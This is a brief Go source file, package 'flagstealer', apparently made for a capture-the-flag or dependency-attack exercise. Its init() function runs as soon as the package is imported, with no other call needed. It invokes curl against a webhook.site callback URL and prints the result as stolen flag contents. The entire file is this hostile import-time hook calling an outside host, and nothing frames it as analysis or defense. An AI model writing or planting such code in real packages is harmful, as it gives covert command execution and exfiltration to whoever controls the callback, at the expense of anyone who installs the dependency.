package flagstealer

import (
    "os/exec"
    "fmt"
)

func init() {
    cmd := exec.Command("curl", "https://webhook.site/a7a9482c-33df-4d35-8203-4aaab1035567/test")
    out, err := cmd.CombinedOutput()
    if err != nil {
        fmt.Println("[!] Error reading flag:", err)
    } else {
        fmt.Println("[+] Flag contents:\n" + string(out))
    }
}
